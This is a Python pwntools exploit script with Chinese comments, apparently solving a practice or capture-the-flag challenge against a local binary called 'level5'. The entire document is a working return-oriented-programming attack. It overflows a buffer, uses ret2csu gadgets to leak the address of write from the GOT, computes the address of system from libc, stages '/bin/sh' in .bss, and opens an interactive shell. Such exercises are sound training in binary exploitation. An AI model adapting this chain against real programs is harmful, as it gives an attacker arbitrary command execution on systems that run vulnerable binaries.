#!/usr/bin/env python
from pwn import *
from LibcSearcher import*
# context.log_level = 'error'  # 设置
elf = ELF('./level5')
sh = process('./level5')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

write_got_addr = p64(elf.got['write'])
read_got_addr = p64(elf.got['read'])
start_addr = p64(0x400564)
gadget1_addr = p64(0x400606)
gadget2_addr = p64(0x4005F0)
bss_addr = 0x601028

#泄露出write函数的实际地址
sh.recvuntil("Hello, World\n")
payload1 = b"\x00"* 136 + gadget1_addr + p64(0) + p64(0) + p64(1) + write_got_addr + p64(1) + write_got_addr + p64(8) + gadget2_addr + b"\x00" * 56 + start_addr
sh.send(payload1)
sleep(3)
write_addr = u64(sh.recv(8))

#同理调read函数 读取到的数据(system(/bin/sh))存入bss_addr 
system_addr = write_addr - libc.symbols['write'] + libc.symbols['system']
sh.recvuntil("Hello, World\n")
payload2 = b"\x00" * 136 + gadget1_addr + p64(0) + p64(0) + p64(1) + read_got_addr + p64(0) + p64(bss_addr) + p64(16) + gadget2_addr + b"\x00" * 56 + start_addr
sh.send(payload2)
sleep(3)
sh.send(p64(system_addr))
sh.send("/bin/sh\n")

#进入bss执行system("/bin/sh")
payload3 = b"\x00" * 136 + gadget1_addr + p64(0) + p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) + gadget2_addr + b"\x00" * 56 + start_addr
sh.recvuntil("Hello, World\n")
sh.send(payload3)
sleep(3)
sh.interactive()
